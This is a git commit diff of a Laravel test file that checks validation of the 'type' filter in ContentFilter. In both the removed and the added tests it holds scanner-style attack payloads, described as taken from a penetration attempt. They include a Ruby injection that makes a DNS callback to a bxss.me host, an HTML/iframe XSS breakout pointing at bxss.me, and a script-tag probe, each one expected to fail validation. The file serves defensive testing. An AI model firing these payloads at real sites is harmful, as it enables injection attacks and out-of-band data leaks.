c0671d89156a660783dc01a864929c64c27aaf51
edlib-oddarne <odd-arne@edlib.com>
2026-03-13 09:08:37 +0100

    Add feature tests and validation for `type` filter in ContentFilter

--- sourcecode/hub/tests/Feature/ContentFilterTest.php
+++ sourcecode/hub/tests/Feature/ContentFilterTest.php
@@ -2,55 +2,36 @@
 
 namespace Tests\Feature;
 
+use App\Http\Requests\ContentFilter;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Http\Response;
+use Illuminate\Support\Facades\Validator;
 use Tests\TestCase;
 
 class ContentFilterTest extends TestCase
 {
-    use RefreshDatabase;
-
-    public function test_content_index_filters_by_h5p_types()
+    public function test_content_filter_validation()
     {
-        config(['scout.driver' => 'collection']);
+        $request = new ContentFilter();
+        $rules = $request->rules();
 
-        $response = $this->get(route('content.index', [
-            'type' => ['H5P.DragText', 'H5P.Flashcards']
-        ]));
+        $validator = Validator::make(['type' => ['H5P.DragText', 'H5P.Flashcards', 'text']], $rules);
+        $this->assertTrue($validator->passes());
 
-        $response->assertStatus(Response::HTTP_OK);
+        $validator = Validator::make(['type' => ['""...".replace("z","o")"']], $rules);
+        $this->assertTrue($validator->fails());
+
+        $validator = Validator::make(['type' => ['+A'.chr(70-3).chr(22*4).chr(108).chr(88).chr(104).chr(81).'require"socket" Socket.gethostbyname("hitza"+"bwdoorkva3024.bxss.me.")[3].to_s+"']], $rules);
+        $this->assertTrue($validator->fails());
+
+        $validator = Validator::make(['type' => ['\'"></style></textarea></iframe></script><iframe src="https://hitztihumywvs.bxss.me"></iframe><link rel=attachment href="https://hitztihumywvs.bxss.me">']], $rules);
+        $this->assertTrue($validator->fails());
+
+        $validator = Validator::make(['type' => ['Accordion\'"()&%<zzz><ScRiPt >w3af(9928)</ScRiPt>']], $rules);
+        $this->assertTrue($validator->fails());
+
+        $validator = Validator::make(['type' => 'string_value'], $rules);
+        $this->assertTrue($validator->fails());
     }
 
-    public function test_content_index_handles_malformed_type_parameter()
-    {
-        $response = $this->get(route('content.index', [
-            'type' => ['""...".replace("z","o")"']
-        ]));
-        $response->assertStatus(404);
-
-        // Example payloads from a penetration attempt
-        $response = $this->get(route('content.index', [
-            'type' => ['"+"A".concat(70-3).concat(22*4).concat(108).concat(88).concat(104).concat(81)+(require"socket" Socket.gethostbyname("hitza"+"bwdoorkva3024.bxss.me.")[3].to_s)+"']
-        ]));
-        $response->assertStatus(404);
-
-        $response = $this->get(route('content.index', [
-            'type' => ['\'"></style></textarea></iframe></script><iframe src="https://hitztihumywvs.bxss.me"></iframe><link rel=attachment href="https://hitztihumywvs.bxss.me">']
-        ]));
-        $response->assertStatus(404);
-
-        $response = $this->get(route('content.index', [
-            'type' => ['Accordion\'"()&%<zzz><ScRiPt >w3af(9928)</ScRiPt>']
-        ]));
-        $response->assertStatus(404);
-    }
-
-    public function test_content_index_handles_type_as_string()
-    {
-        $response = $this->get(route('content.index', [
-            'type' => 'string_value'
-        ]));
-
-        $response->assertStatus(Response::HTTP_NOT_FOUND);
-    }
 }
